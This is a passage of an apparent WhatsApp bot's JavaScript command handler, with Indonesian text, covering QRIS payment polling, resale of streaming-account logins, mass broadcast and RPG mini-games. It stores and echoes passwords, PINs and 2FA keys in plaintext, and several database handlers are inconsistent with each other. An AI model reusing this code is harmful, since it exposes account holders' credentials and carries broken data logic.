    contextInfo: { mentionedJid: [m.sender] },
  });

  db.users[m.sender] = {
    status_deposit: true,
    saweria: {
      msg: msgQr,
      chat: m.sender,
      idDeposit: paymentData.transactionId,
      amount: paymentData.amount.toString(),
      exp: function () {
        setTimeout(async () => {
          if (db.users[m.sender].status_deposit) {
            await gisnaxd.sendMessage(db.users[m.sender].saweria.chat, { text: "QRIS Pembayaran telah expired!" });
            db.users[m.sender].status_deposit = false;
            delete db.users[m.sender].saweria;
          }
        }, 300000);
      }
    }
  };
  await db.users[m.sender].saweria.exp();

  while (db.users[m.sender].status_deposit) {
    await new Promise(resolve => setTimeout(resolve, 8000));
    const resultcek = await axios.get(`${global.webapi}/api/orkut/cekstatus?merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}&apikey=${global.restapi}`);
    const req = resultcek.data;
    if (req?.amount == db.users[m.sender].saweria.amount) {
      db.users[m.sender].status_deposit = false;
      await gisnaxd.sendMessage(m.chat, { text: `✅ PEMBAYARAN BERHASIL ✅\n\n📌 ID: ${db.users[m.sender].saweria.idDeposit}\n💰 Total: Rp${await toIDR(db.users[m.sender].saweria.amount)}\n📦 Barang: ${product}` });
      let transaksiSukses = {
  id: db.users[m.sender].saweria.idDeposit,
  user: m.sender,
  amount: db.users[m.sender].saweria.amount,
  method: "QRIS"
};

await sendPaymentNotificationToOwner(transaksiSukses);
      
      // Ambil akun dari stok
      if (!akunData[product] || akunData[product].akun.length < jumlah) {
        return gisnaxd.sendMessage(m.chat, { text: "⚠️ Stok akun tidak mencukupi!" });
      }

      const akunList = akunData[product].akun.splice(0, jumlah);
      akunData[product].stok -= jumlah;
      akunData[product].terjual += jumlah;
      fs.writeFileSync(akunPath, JSON.stringify(akunData, null, 2));

      const akunDetails = akunList.map((akun, idx) => `Akun ${idx + 1}:\nEmail: ${akun.email}\nPassword: ${akun.password}\nPIN: ${akun.pin}\n2FA: ${akun.fa2}\nProfil: ${akun.profil}`).join("\n\n");

      const fileName = `./library/pembelian/pembelian_${m.sender.replace(/@s\.whatsapp\.net/, "")}_${Date.now()}.txt`;
      fs.writeFileSync(fileName, akunDetails);

      await gisnaxd.sendMessage(m.chat, {
        document: fs.readFileSync(fileName),
        mimetype: "text/plain",
        fileName: `Akun_${product}.txt`,
        caption: "✅ *PEMBELIAN BERHASIL* ✅\n\nTerima kasih atas pembelian Anda!",
      });

      setTimeout(() => { fs.unlinkSync(fileName); }, 10000);
      delete db.users[m.sender].saweria;
    }
  }
} break;


case "delproduk": {
  const fs = require("fs");
    
    
    if (!isOwner) return m.reply('Fitur Ini hanya dapat di akses Oleh Owner!')

  const akunDataPath = "./library/database/stok.json";

  // Load data akun dari file
  let akunData = fs.existsSync(akunDataPath)
    ? JSON.parse(fs.readFileSync(akunDataPath, "utf8"))
    : {};

  // Format input
  if (!text)
    return m.reply(
      `*Format Salah!*\n\nContoh: delproduk <kode> <email>\n\n*Contoh:* delakun viu email@mail.com`
    );

  const args = text.split(" ");
  const kode = args[0];
  const email = args[1];

  if (!kode || !email) {
    return m.reply(
      `*Format Salah!*\n\nContoh: delakun viu nicvis@yopmail.com`
    );
  }

  // Periksa apakah kode produk ada
  if (!akunData[kode]) {
    return m.reply(`Kode *${kode}* tidak ditemukan dalam database.`);
  }

  // Temukan indeks akun berdasarkan email
  const akunIndex = akunData[kode].akun.findIndex((a) => a.email === email);

  if (akunIndex === -1) {
    return m.reply(`Akun dengan email *${email}* tidak ditemukan dalam produk *${akunData[kode].nama}*.`);
  }

  // Hapus akun dari array
  akunData[kode].akun.splice(akunIndex, 1);

  // Perbarui stok
  akunData[kode].stok -= 1;

  // Jika stok habis, bisa pilih untuk menghapus produk sepenuhnya (opsional)
  if (akunData[kode].akun.length === 0) {
    delete akunData[kode]; // Hapus produk jika tidak ada akun tersisa
  }

  // Simpan perubahan ke file
  fs.writeFileSync(akunDataPath, JSON.stringify(akunData, null, 2));

  // Konfirmasi sukses
  m.reply(`Akun dengan email *${email}* berhasil dihapus dari produk *${kode.toUpperCase()}*.`);
}
break;
//----------------------------------------------------------------------------------------------------- addakun
case "addproduk": {
  const fs = require("fs");
  if (!isOwner) return m.reply('❌ Fitur ini hanya dapat diakses oleh Owner!');

  const akunDataPath = "./library/database/stok.json";
  let akunData = fs.existsSync(akunDataPath)
    ? JSON.parse(fs.readFileSync(akunDataPath, "utf8"))
    : {};

  // Format input
  if (!text)
    return m.reply(
      `*❌ Format Salah!*\n\nContoh: .addproduk viu VIU_Premium 2500 "Akun Viu Premium 1 bulan"`
    );

  const args = text.split(" ");
  const kode = args[0];
  const namaProduk = args[1].replace(/_/g, " "); // Ganti underscore jadi spasi
  const harga = parseInt(args[2]);
  const deskripsi = args.slice(3).join(" ");

  if (!kode || !namaProduk || isNaN(harga) || !deskripsi) {
    return m.reply(
      `*❌ Format Salah!*\n\nContoh: .addproduk viu VIU_Premium 2500 "Akun Viu Premium 1 bulan"`
    );
  }

  // Simpan produk tanpa data akun
  akunData[kode] = {
    nama: namaProduk,
    harga: harga,
    deskripsi: deskripsi,
    stok: akunData[kode] ? akunData[kode].stok : 0, // Jika ada stok sebelumnya, tetap dipertahankan
    terjual: akunData[kode] ? akunData[kode].terjual : 0,
  };

  // Simpan data kembali ke file
  fs.writeFileSync(akunDataPath, JSON.stringify(akunData, null, 2));

  // Konfirmasi sukses
  m.reply(
    `✅ *Produk berhasil ditambahkan!*\n\n📌 *Nama Produk:* ${namaProduk}\n🏷 *Kode:* ${kode.toUpperCase()}\n💰 *Harga:* ${harga}\n📝 *Deskripsi:* ${deskripsi}`
  );
}
break;

case "addstock": {
  const fs = require("fs");
  if (!isOwner) return m.reply("Fitur ini hanya dapat diakses oleh Owner!");

  const akunDataPath = "./library/database/stok.json";
  let akunData = fs.existsSync(akunDataPath)
    ? JSON.parse(fs.readFileSync(akunDataPath, "utf8"))
    : {};

  if (!text)
    return m.reply(
      `*Format Salah!*\n\nContoh: .addstock viu,email@example.com,password123,1234,2FAKEY,profil1`
    );

  const args = text.split(",");
  if (args.length < 6) {
    return m.reply(
      `*Format Salah!*\n\nContoh: .addstock viu,email@example.com,password123,1234,2FAKEY,profil1`
    );
  }

  const kode = args[0]?.trim();
  const email = args[1]?.trim();
  const password = args[2]?.trim();
  const pin = args[3]?.trim();
  const fa2 = args[4]?.trim();
  const profil = args[5]?.trim();

  if (!kode || !email || !password || !pin || !fa2 || !profil) {
    return m.reply(
      `*Format Salah!*\n\nContoh: .addstock viu,email@example.com,password123,1234,2FAKEY,profil1`
    );
  }

  // Jika produk belum ada, buat produk baru
  if (!akunData[kode]) {
    akunData[kode] = {
      nama: kode.toUpperCase(),
      harga: 0, // Harga default jika belum diatur
      stok: 0,
      terjual: 0,
      akun: [] // Pastikan array akun sudah ada
    };
  }

  // Pastikan `akun` adalah array sebelum melakukan push
  if (!Array.isArray(akunData[kode].akun)) {
    akunData[kode].akun = [];
  }

  // Tambahkan akun baru ke stok
  akunData[kode].akun.push({
    email: email,
    password: password,
    pin: pin,
    fa2: fa2,
    profil: profil
  });

  // Tambahkan stok
  akunData[kode].stok += 1;

  // Simpan data kembali ke file
  fs.writeFileSync(akunDataPath, JSON.stringify(akunData, null, 2));

  // Konfirmasi sukses
  m.reply(
    `✅ Akun berhasil ditambahkan ke produk *${akunData[kode].nama}*!\n\n` +
    `📌 Kode: *${kode.toUpperCase()}*\n` +
    `📧 Email: *${email}*\n` +
    `🔑 Password: *${password}*\n` +
    `🔢 PIN: *${pin}*\n` +
    `🔐 2FA: *${fa2}*\n` +
    `👤 Profil: *${profil}*\n` +
    `📦 Stok Sekarang: *${akunData[kode].stok}*`
  );
}
break;

case "delstock": {
  const fs = require("fs");
  if (!isOwner) return m.reply('Fitur ini hanya dapat diakses oleh Owner!');

  const akunDataPath = "./library/database/stok.json";
  let akunData = fs.existsSync(akunDataPath)
    ? JSON.parse(fs.readFileSync(akunDataPath, "utf8"))
    : {};

  if (!text)
    return m.reply(
      `*Format Salah!*\n\nContoh: .delstock viu,email@example.com`
    );

  const args = text.split(",");
  const kode = args[0]?.trim();
  const email = args[1]?.trim();

  if (!kode || !email) {
    return m.reply(`*Format Salah!*\n\nContoh: .delstock viu,email@example.com`);
  }

  // Cek apakah produk ada
  if (!akunData[kode]) {
    return m.reply(`Produk *${kode.toUpperCase()}* tidak ditemukan!`);
  }

  // Cari akun berdasarkan email
  const index = akunData[kode].akun.findIndex((acc) => acc.email === email);
  if (index === -1) {
    return m.reply(`Akun dengan email *${email}* tidak ditemukan dalam stok *${kode.toUpperCase()}*!`);
  }

  // Hapus akun dari stok
  akunData[kode].akun.splice(index, 1);
  akunData[kode].stok -= 1;

  // Jika stok kosong, hapus produk
  if (akunData[kode].stok <= 0) {
    delete akunData[kode];
  }

  // Simpan perubahan ke file
  fs.writeFileSync(akunDataPath, JSON.stringify(akunData, null, 2));

  m.reply(`Akun dengan email *${email}* berhasil dihapus dari produk *${kode.toUpperCase()}*!`);
}
break;

case "ambilstock": {
  const fs = require("fs");
  if (!isOwner) return m.reply('Fitur ini hanya dapat diakses oleh Owner!');

  const akunDataPath = "./library/database/stok.json";
  let akunData = fs.existsSync(akunDataPath)
    ? JSON.parse(fs.readFileSync(akunDataPath, "utf8"))
    : {};

  if (!text)
    return m.reply(
      `*Format Salah!*\n\nContoh: .ambilstock viu,2`
    );

  const args = text.split(",");
  const kode = args[0]?.trim();
  const jumlah = parseInt(args[1]?.trim());

  if (!kode || isNaN(jumlah) || jumlah <= 0) {
    return m.reply(`*Format Salah!*\n\nContoh: .ambilstock viu,2`);
  }

  // Cek apakah produk ada
  if (!akunData[kode]) {
    return m.reply(`Produk *${kode.toUpperCase()}* tidak ditemukan!`);
  }

  // Cek apakah ada cukup stok tersedia
  if (akunData[kode].stok < jumlah) {
    return m.reply(`Stok untuk *${kode.toUpperCase()}* tidak mencukupi! Hanya tersedia *${akunData[kode].stok}* akun.`);
  }

  // Ambil akun sebanyak jumlah yang diminta
  let akunDiambil = akunData[kode].akun.splice(0, jumlah);
  akunData[kode].stok -= jumlah;
  akunData[kode].terjual += jumlah;

  // Jika stok habis, hapus produk dari daftar
  if (akunData[kode].stok <= 0) {
    delete akunData[kode];
  }

  // Simpan perubahan ke file
  fs.writeFileSync(akunDataPath, JSON.stringify(akunData, null, 2));

  // Format hasil
  let hasil = `Berhasil mengambil *${jumlah}* akun dari stok *${kode.toUpperCase()}*!\n\n`;
  akunDiambil.forEach((akun, index) => {
    hasil += `*Akun ${index + 1}:*\n📧 Email: *${akun.email}*\n🔑 Password: *${akun.password}*\n🔢 PIN: *${akun.pin}*\n🔒 2FA: *${akun.fa2}*\n🆔 Profil: *${akun.profil}*\n\n`;
  });

  // Kirim detail akun ke pengguna
  m.reply(hasil);
}
break;

//=====Fitur-New

case 'broadcast':
case 'bc': {
    if (!isOwner) return m.reply('❌ Perintah ini hanya untuk owner!');
    if (!text) {
        return m.reply(`*╭──[ 📝 BROADCAST - USAGE ]*
᎒⊸ Masukkan pesan yang ingin di-broadcast.
᎒⊸ Reply media jika ingin mengirim pesan dengan media.
᎒⊸ Gunakan *\`--group\`* untuk mengirim pesan ke semua grup.
*╰────────────•*`);
    }

    const MSG = Object.keys(store.messages);
    const groupChats = MSG.filter((id) => id.endsWith("@g.us"));
    const privateChats = MSG.filter((id) => id.endsWith("@s.whatsapp.net"));

    let successCount = 0;
    let q = m.quoted || m;
    
    if (text.includes("--group")) {
        let input = text.replace("--group", "").trim();
        if (!groupChats.length) return m.reply("*❌ Tidak ada grup ditemukan untuk broadcast.*");

        for (let groupId of groupChats) {
            try {
                if (q) {
                    // Jika ada media yang dikutip
                    let media = await q.download();
                    await gisnaxd.sendMessage(groupId, { caption: input, image: media });
                } else {
                    await gisnaxd.sendMessage(groupId, { text: input });
                }
                successCount++;
            } catch (error) {
                console.error(`❌ Gagal mengirim ke grup ${groupId}:`, error.message);
            }
        }
        return m.reply(`*╭──[ 乂 BROADCAST - GRUP ]*
᎒⊸ Total Grup: *${groupChats.length}*
᎒⊸ Berhasil Terkirim: *${successCount}*
*╰────────────•*`);
    } else {
        if (!privateChats.length) return m.reply("*❌ Tidak ada kontak ditemukan untuk broadcast.*");

        for (let contactId of privateChats) {
            try {
                if (q) {
                    // Jika ada media yang dikutip
                    let media = await q.download();
                    await gisnaxd.sendMessage(contactId, { caption: text, image: media });
                } else {
                    await gisnaxd.sendMessage(contactId, { text: text });
                }
                successCount++;
            } catch (error) {
                console.error(`❌ Gagal mengirim ke kontak ${contactId}:`, error.message);
            }
        }
        return m.reply(`*╭──[ 乂 BROADCAST - USER ]*
᎒⊸ Total Kontak: *${privateChats.length}*
᎒⊸ Berhasil Terkirim: *${successCount}*
*╰────────────•*`);
    }
}
break;
//===Fitur-Games
case "daftar": {
    const fs = require("fs");
    const dbFile = "./library/database/db.json";

    // Fungsi membaca database
    const loadDB = () => {
        if (fs.existsSync(dbFile)) {
            return JSON.parse(fs.readFileSync(dbFile, "utf8"));
        }
        return {};
    };

    // Fungsi menyimpan database
    const saveDB = (db) => {
        fs.writeFileSync(dbFile, JSON.stringify(db, null, 2));
    };

    let db = loadDB();

    if (db[m.sender]) {
        return gisnaxd.sendMessage(m.chat, { text: "❌ Kamu sudah terdaftar dalam sistem RPG." }, { quoted: m });
    }

    // Data awal user
    db[m.sender] = {
        name: m.pushName || "Player",
        level: 1,
        rpg: {
            money: 5000, // Uang awal
            energy: 100, // Energi awal
            inventory: [], // Inventaris kosong
            coin: 0 // Koin awal
        },
        bank: 0, // Saldo bank awal
        lastbansos: 0 // Waktu terakhir bansos
    };

    saveDB(db);

    gisnaxd.sendMessage(m.chat, { text: 
`✅ *Pendaftaran Berhasil!*
🎮 *Nama:* ${m.pushName || "Player"}
🏆 *Level:* 1
💰 *Uang:* RP 5,000
🪙 *Koin:* 0
⚡ *Energi:* 100
🏦 *Bank:* RP 0
📦 *Inventaris:* Kosong`
    }, { quoted: m });

    break;
}

case "bank": {
    const fs = require("fs");
    const dbFile = "./library/database/db.json";

    // Fungsi membaca database
    const loadDB = () => {
        if (fs.existsSync(dbFile)) {
            return JSON.parse(fs.readFileSync(dbFile, "utf8"));
        }
        return {};
    };

    // Fungsi menyimpan database
    const saveDB = (db) => {
        fs.writeFileSync(dbFile, JSON.stringify(db, null, 2));
    };

    // Fungsi format uang
    const formatMoney = (amount) => amount.toLocaleString("id-ID");

    let db = loadDB();
    if (!db[m.sender]) {
        return m.reply("❌ Kamu belum terdaftar! Gunakan *!daftar* untuk mendaftar.");
    }

    const user = db[m.sender];

    let message = `╭═══❯ 🏦 *BANK* ❮═══╮\n` +
                  `│\n` +
                  `│ 👤 *Akun*\n` +
                  `│ 📝 Nama: ${user.name}\n` +
                  `│ 🏆 Level: ${user.level}\n` +
                  `│\n` +
                  `│ 💰 *Saldo*\n` +
                  `│ 💵 Cash: RP ${formatMoney(user.rpg.money)}\n` +
                  `│ 💳 Bank: RP ${formatMoney(user.bank)}\n` +
                  `│\n` +
                  `│ 📋 *Perintah*\n` +
                  `│ 💸 *.depositrpg <jumlah>*\n` +
                  `│ 💰 *.pull <jumlah>*\n` +
                  `╰═══════════════════╯`;

    m.reply(message);
    break;
}

case "depositrpg": {
    const fs = require("fs");
    const dbFile = "./library/database/db.json";

    const loadDB = () => {
        if (fs.existsSync(dbFile)) {
            return JSON.parse(fs.readFileSync(dbFile, "utf8"));
        }
        return {};
    };

    const saveDB = (db) => {
        fs.writeFileSync(dbFile, JSON.stringify(db, null, 2));
    };

    const formatMoney = (amount) => amount.toLocaleString("id-ID");

    let db = loadDB();
    if (!db[m.sender]) {
        return m.reply("❌ Kamu belum terdaftar! Gunakan *.daftar* untuk mendaftar.");
    }

    let [_, amountText] = m.text.split(" ");
    let amount = parseInt(amountText);

    if (!amount || isNaN(amount) || amount <= 0) {
        return m.reply("❌ Masukkan jumlah deposit yang valid!");
    }

    if (db[m.sender].rpg.money < amount) {
        return m.reply(`❌ Uang tunai tidak cukup! Kamu butuh RP ${formatMoney(amount)}.`);
    }

    db[m.sender].rpg.money -= amount;
    db[m.sender].bank += amount;
    saveDB(db);

    m.reply(`✅ *Deposit Berhasil!*\n💸 Jumlah: RP ${formatMoney(amount)}\n🏦 Bank Sekarang: RP ${formatMoney(db[m.sender].bank)}\n💵 Cash Sekarang: RP ${formatMoney(db[m.sender].rpg.money)}`);
    break;
}

case "pull": {
    const fs = require("fs");
    const dbFile = "./library/database/db.json";

    const loadDB = () => {
        if (fs.existsSync(dbFile)) {
            return JSON.parse(fs.readFileSync(dbFile, "utf8"));
        }
        return {};
    };

    const saveDB = (db) => {
        fs.writeFileSync(dbFile, JSON.stringify(db, null, 2));
    };

    const formatMoney = (amount) => amount.toLocaleString("id-ID");

    let db = loadDB();
    if (!db[m.sender]) {
        return m.reply("❌ Kamu belum terdaftar! Gunakan *!daftar* untuk mendaftar.");
    }

    let [_, amountText] = m.text.split(" ");
    let amount = parseInt(amountText);

    if (!amount || isNaN(amount) || amount <= 0) {
        return m.reply("❌ Masukkan jumlah tarik yang valid!");
    }

    if (db[m.sender].bank < amount) {
        return m.reply(`❌ Saldo bank tidak cukup! Kamu butuh RP ${formatMoney(amount)}.`);
    }

    db[m.sender].bank -= amount;
    db[m.sender].rpg.money += amount;
    saveDB(db);

    m.reply(`✅ *Penarikan Berhasil!*\n💸 Jumlah: RP ${formatMoney(amount)}\n🏦 Bank Sekarang: RP ${formatMoney(db[m.sender].bank)}\n💵 Cash Sekarang: RP ${formatMoney(db[m.sender].rpg.money)}`);
    break;
}
case "bansos": {
    const fs = require("fs");
    const dbFile = "./library/database/db.json";

    const loadDB = () => {
        if (fs.existsSync(dbFile)) {
            return JSON.parse(fs.readFileSync(dbFile, "utf8"));
        }
        return {};
    };

    const saveDB = (db) => {
        fs.writeFileSync(dbFile, JSON.stringify(db, null, 2));
    };

    const formatMoney = (amount) => amount.toLocaleString("id-ID");

    let db = loadDB();
    if (!db[m.sender]) {
        return gisnaxd.sendMessage(m.chat, { text: "❌ Kamu belum terdaftar! Gunakan *.daftar* untuk mendaftar." }, { quoted: m });
    }

    let user = db[m.sender];
    let time = new Date().getTime();
    let cooldown = 86400000; // 24 jam
    let lastBansos = user.lastbansos || 0;

    if (time - lastBansos < cooldown) {
        let remaining = cooldown - (time - lastBansos);
        let hours = Math.floor(remaining / 3600000);
        let minutes = Math.floor((remaining % 3600000) / 60000);

        return gisnaxd.sendMessage(m.chat, { text: 
`╔══════════════════════
║ 🕐 *COOLDOWN BANSOS*
╠══════════════════════
║ ⏰ Tunggu *${hours} jam ${minutes} menit*
║ 📝 Sebelum mengambil bansos lagi
╚══════════════════════`
        }, { quoted: m });
    }

    // 30% kemungkinan gagal
    const chance = Math.random() * 100;
    if (chance <= 30) {
        user.lastbansos = time;
        saveDB(db);
        return gisnaxd.sendMessage(m.chat, { text: 
`╔═══════════════════════
║ 📢 *BANSOS GAGAL*
╠═══════════════════════
║ 😔 Kamu gagal mendapatkan bansos.
║ 📝 Coba lagi besok!
╚═══════════════════════`
        }, { quoted: m });
    }

    // Hadiah bansos (uang & coin)
    let moneyReward = Math.floor(Math.random() * (2000000 - 1000000 + 1)) + 1000000;
    let coinReward = Math.floor(Math.random() * (50 - 30 + 1)) + 30;

    // Update data user
    user.rpg.money = (user.rpg.money || 0) + moneyReward;
    user.rpg.coin = (user.rpg.coin || 0) + coinReward;
    user.lastbansos = time;
    saveDB(db);

    gisnaxd.sendMessage(m.chat, { text: 
`╔════════════════════════
║ 🎊 *BANSOS BERHASIL* 🎊
╠════════════════════════
║ 💰 *Reward Uang:* Rp ${formatMoney(moneyReward)}
║ 🪙 *Reward Coin:* ${coinReward} coins
║ 
║ 📊 *Saldo Sekarang:*
║ 💵 Rp ${formatMoney(user.rpg.money)}
║ 🪙 ${user.rpg.coin} coins
║ 
║ ⏰ Kembali lagi dalam 24 jam!
╚════════════════════════`
    }, { quoted: m });

    break;
}
case "profile": {
    const fs = require("fs");
    const dbFile = "./library/database/db.json";

    // Fungsi membaca database
    const loadDB = () => {
        if (fs.existsSync(dbFile)) {
            return JSON.parse(fs.readFileSync(dbFile, "utf8"));
        }
        return {};
    };

    let db = loadDB();
    let usr = db[m.sender]; // Ambil data pengguna

    // Cek apakah user sudah terdaftar
    if (!usr || !usr.name) {
        return gisnaxd.sendMessage(m.chat, { text: "❌ Kamu belum terdaftar! Gunakan perintah *.daftar <namamu>* untuk mendaftar." }, { quoted: m });
    }

    let rpg = usr.rpg || {}; // Jika tidak ada, set default kosong

    // Pastikan semua data memiliki nilai default 0 jika tidak ada
    usr.level = usr.level || 0;
    usr.banned = usr.banned || false;
    usr.register = usr.register || false;
    usr.bank = usr.bank || 0;
    
    rpg.money = rpg.money || 0;
    rpg.coin = rpg.coin || 0;
    rpg.sampah = rpg.sampah || 0;
    rpg.botol = rpg.botol || 0;
    rpg.kardus = rpg.kardus || 0;
    rpg.iron = rpg.iron || 0;
    rpg.kayu = rpg.kayu || 0;
    rpg.kaleng = rpg.kaleng || 0;
    rpg.gelas = rpg.gelas || 0;
    rpg.plastik = rpg.plastik || 0;
    rpg.lastGajian = rpg.lastGajian || 0;
    rpg.lastMulung = rpg.lastMulung || 0;
    rpg.lastTaxy = rpg.lastTaxy || 0;

    // Fungsi untuk format angka
    const formatNumber = (num) => num.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");

    let profile = `╭━━━「 *PROFILE* 」━━━⊷\n`;
    profile += `┃ ⬡ *Name:* ${usr.name}\n`;
    profile += `┃ ⬡ *Level:* ${usr.level} ✨\n`;
    profile += `┃ ⬡ *Banned:* ${usr.banned ? "Yes ⛔" : "No ✅"}\n`;
    profile += `╰━━━━━━━━━━━━━━━⊷\n\n`;

    profile += `╭━━━「 *BALANCE* 」━━━⊷\n`;
    profile += `┃ ⬡ *Money:* RP ${formatNumber(rpg.money)} 💵\n`;
    profile += `┃ ⬡ *Bank:* RP ${formatNumber(usr.bank)} 🏦\n`;
    profile += `┃ ⬡ *Coin:* ${formatNumber(rpg.coin)} 🪙\n`;
    profile += `╰━━━━━━━━━━━━━━━⊷\n\n`;

    profile += `╭━━━「 *INVENTORY* 」━━━⊷\n`;
    profile += `┃ ⬡ *Sampah:* ${formatNumber(rpg.sampah)} 🗑️\n`;
    profile += `┃ ⬡ *Botol:* ${formatNumber(rpg.botol)} 🧊\n`;
    profile += `┃ ⬡ *Kardus:* ${formatNumber(rpg.kardus)} 📦\n`;
    profile += `┃ ⬡ *Iron:* ${formatNumber(rpg.iron)} ⚔️\n`;
    profile += `┃ ⬡ *Kayu:* ${formatNumber(rpg.kayu)} 🪵\n`;
    profile += `┃ ⬡ *Kaleng:* ${formatNumber(rpg.kaleng)} 🥫\n`;
    profile += `┃ ⬡ *Gelas:* ${formatNumber(rpg.gelas)} 🥛\n`;
    profile += `┃ ⬡ *Plastik:* ${formatNumber(rpg.plastik)} ♻️\n`;
    profile += `╰━━━━━━━━━━━━━━━⊷\n\n`;

    const now = Date.now();
    const gajianCD = (rpg.lastGajian || 0) + 3600 * 1000 - now;
    const mulungCD = (rpg.lastMulung || 0) + 3600 * 1000 - now;
    const taxyCD = (rpg.lastTaxy || 0) + 3600 * 1000 - now;

    profile += `╭━━━「 *COOLDOWNS* 」━━━⊷\n`;
    profile += `┃ ⬡ *Gajian:* ${gajianCD > 0 ? Math.floor(gajianCD / 1000) + "s" : "Ready!"} ⏰\n`;
    profile += `┃ ⬡ *Mulung:* ${mulungCD > 0 ? Math.floor(mulungCD / 1000) + "s" : "Ready!"} ⏰\n`;
    profile += `┃ ⬡ *Taxy:* ${taxyCD > 0 ? Math.floor(taxyCD / 1000) + "s" : "Ready!"} ⏰\n`;
    profile += `╰━━━━━━━━━━━━━━━⊷\n\n`;

    let urlPic;
    try {
        urlPic = await gisnaxd.profilePictureUrl(m.sender, "image");
    } catch {
        urlPic = "https://telegra.ph/file/d31fcc46b09ce7bf236a7.jpg"; // Default picture jika tidak ada
    }

    gisnaxd.sendMessage(m.chat, {
        image: { url: urlPic },
        caption: profile,
        footer: "Rpg Made In QoupayBotz",
        buttons: [
            { buttonId: ".menu", buttonText: { displayText: "Back To Menu" } },
        ],
        viewOnce: true,
        headerType: 6,
    }, { quoted: m });

    break;
}

case "ban":
case "unban": {
    if (!isOwner) return gisnaxd.sendMessage(m.chat, { text: "❌ Hanya owner yang bisa menggunakan perintah ini!" }, { quoted: m });

    let target;
    if (m.mentionedJid.length > 0) {
        target = m.mentionedJid[0]; // Jika ada tag, gunakan tag
    } else if (args[0]) {
        target = args[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net"; // Jika pakai nomor, konversi ke format JID
    } else {
        return gisnaxd.sendMessage(m.chat, { text: "❌ Masukkan nomor atau tag pengguna yang ingin dibanned/unbanned!" }, { quoted: m });
    }

    const dbFile = "./library/database/db.json";
    const fs = require("fs");

    // Load database
    const loadDB = () => {
        if (fs.existsSync(dbFile)) return JSON.parse(fs.readFileSync(dbFile, "utf8"));
        return {};
    };

    let db = loadDB();
    if (!db[target]) db[target] = { banned: false, name: "User" };

    let number = target.split("@")[0];

    if (command === "ban") {
        db[target].banned = true;
        gisnaxd.sendMessage(m.chat, { 
            text: `✅ *BANNED!*\n\n📛 *Nomor:* ${number}\n📌 *Akun:* @${number}\n⛔ Pengguna ini telah *DIBANNED*!`, 
            mentions: [target] 
        }, { quoted: m });
    } else {
        db[target].banned = false;
        gisnaxd.sendMessage(m.chat, { 
            text: `✅ *UNBAN!*\n\n📛 *Nomor:* ${number}\n📌 *Akun:* @${number}\n✅ Pengguna ini telah *DIBUKA BANNED*!`, 
            mentions: [target] 
        }, { quoted: m });
    }

    // Simpan database
    fs.writeFileSync(dbFile, JSON.stringify(db, null, 2));
    break;
}

case "taxy":
case "taksi": {
    const fs = require("fs");

    // Fungsi untuk membaca database dari db.json
    function readDB() {
        try {
            let data = fs.readFileSync("./library/database/db.json", "utf8");
            return JSON.parse(data);
        } catch (err) {
            return { user: {} }; // Jika file tidak ada atau error, buat objek default
        }
    }

    // Fungsi untuk menulis database ke db.json
    function writeDB(data) {
        fs.writeFileSync("./library/database/db.json", JSON.stringify(data, null, 2));
    }

    let dbData = readDB();
    let sender = m.sender;

    // Pastikan data user ada
    if (!dbData.user[sender]) {
        dbData.user[sender] = { rpg: { money: 0, exp: 0, lastTaxy: 0 } };
    }

    let usr = dbData.user[sender];
    let rpg = usr.rpg;
    let lastTaxy = rpg.lastTaxy || 0;
    let now = Date.now();
    let cooldown = 14400000; // 4 jam dalam milidetik

    // Cek cooldown taksi
    if (now - lastTaxy < cooldown) {
        let timeLeft = Math.ceil((cooldown - (now - lastTaxy)) / 1000);
        return gisnaxd.sendMessage(m.chat, { text: `⏳ Tunggu ${timeLeft} detik sebelum kamu dapat menggunakan taksi lagi.` }, { quoted: m });
    }

    let prosesTaksi = [
        "🚗 Sedang Mencari Penumpang...",
        "🚗 Menemukan Penumpang 👨...",
        "🚗 Berangkat Ke Tujuan...",
        "👨 Menerima Gaji Dari Penumpang 💸..."
    ];
    
    for (let txt of prosesTaksi) {
        await gisnaxd.sendMessage(m.chat, { text: txt }, { quoted: m });
        await sleep(7000);
    }

    // Generate uang dan exp secara acak
    let randomMoney = Math.floor(Math.random() * (500000 - 100000 + 1)) + 100000;
    let randomExp = Math.floor(Math.random() * 50000) + 1;

    // Update data RPG pengguna
    rpg.money += randomMoney;
    rpg.exp += randomExp;
    rpg.lastTaxy = now;

    // Simpan perubahan ke database
    db.write(dbData);

    let hasilNyaTxt = `
💼 *Perjalanan Selesai!*
━━━━━━━━━━━━━━━━━
💵 *Gaji Diterima:* +${randomMoney.toLocaleString()} uang  
🎯 *Pengalaman:* +${randomExp.toLocaleString()} exp  
━━━━━━━━━━━━━━━━━
🚀 Teruslah bekerja keras dan kumpulkan lebih banyak gaji!
`.trim();

    let imageUrl = "https://files.catbox.moe/rz9br7.jpg";

    gisnaxd.sendMessage(m.chat, {
        image: { url: imageUrl },
        caption: hasilNyaTxt,
        footer: "Rpg Made In QoupayBotz",
        buttons: [
            {
                buttonId: ".menu",
                buttonText: { displayText: "Back To Menu" }
            }
        ],
        viewOnce: true,
        headerType: 4
    }, { quoted: m });

    break;
}



case "kurir": {
const fs = require("fs");

    // Fungsi untuk membaca database dari db.json
    function readDB() {
        try {
            let data = fs.readFileSync("./library/database/db.json", "utf8");
            return JSON.parse(data);
        } catch (err) {
            return { user: {} }; // Jika file tidak ada atau error, buat objek default
        }
    }

    // Fungsi untuk menulis database ke db.json
    function writeDB(data) {
        fs.writeFileSync("./library/database/db.json", JSON.stringify(data, null, 2));
    }

    let dbData = readDB();
    let sender = m.sender;

    // Pastikan data user ada
    if (!dbData.user[sender]) {
        dbData.user[sender] = { rpg: { money: 0, exp: 0, lastTaxy: 0 } };
    }

    let usr = dbData.user[sender];
    let rpg = usr.rpg;
    let lastKurir = rpg.lastKurir || 0;
    let now = Date.now();
    let cooldown = 14400000;

    if (now - lastKurir < cooldown) {
        let timeLeft = Math.ceil((cooldown - (now - lastKurir)) / 1000);
        return gisnaxd.sendMessage(m.chat, { text: `Tunggu ${timeLeft} detik sebelum bisa menjadi kurir lagi.` }, { quoted: m });
    }

    let prosesKurir = [
        "📦 Mengambil paket dari gudang...",
        "🚲 Berangkat mengantar paket...",
        "🏠 Sampai di tujuan, menyerahkan paket...",
        "💰 Menerima bayaran dari pelanggan!"
    ];

    for (let txt of prosesKurir) {
        await gisnaxd.sendMessage(m.chat, { text: txt }, { quoted: m });
        await sleep(5000);
    }

    let randomMoney = Math.floor(Math.random() * (400000 - 80000 + 1)) + 80000;
    let randomExp = Math.floor(Math.random() * 45000) + 1;

    rpg.money += randomMoney;
